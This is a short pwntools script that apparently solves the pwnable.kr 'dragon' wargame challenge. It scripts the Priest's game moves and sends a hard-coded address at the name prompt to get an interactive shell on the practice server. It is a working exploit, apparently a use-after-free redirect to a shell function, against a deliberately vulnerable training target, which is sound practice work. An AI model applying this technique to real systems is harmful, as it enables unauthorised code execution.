from pwn import *

def choose_player(player_code):
    io.sendlineafter('Knight\n', player_code)


def choose_attack(attack_code):
    # hard coded for priest attacks
    io.sendlineafter('Invincible.\n', attack_code)


io = remote('pwnable.kr', 9004)

PRIEST_CODE = '1'

DAMAGE_ATTACK_CODE = '1'
REFRESH_MANA_ATTACK_CODE = '2'
INVINCIBLE_ATTACK_CODE = '3'

choose_player(PRIEST_CODE)

attacks_until_mama_dragon = [DAMAGE_ATTACK_CODE, DAMAGE_ATTACK_CODE]

for attack in attacks_until_mama_dragon:
    choose_attack(attack)

choose_player(PRIEST_CODE)

attacks = [
    INVINCIBLE_ATTACK_CODE,
    INVINCIBLE_ATTACK_CODE,
    REFRESH_MANA_ATTACK_CODE
]

for i in range(4):
    for attack in attacks:
        choose_attack(attack)

SHELL_ADDRESS = 0x08048dbf

io.sendlineafter('The World Will Remember You As:\n', p32(SHELL_ADDRESS))

io.interactive()
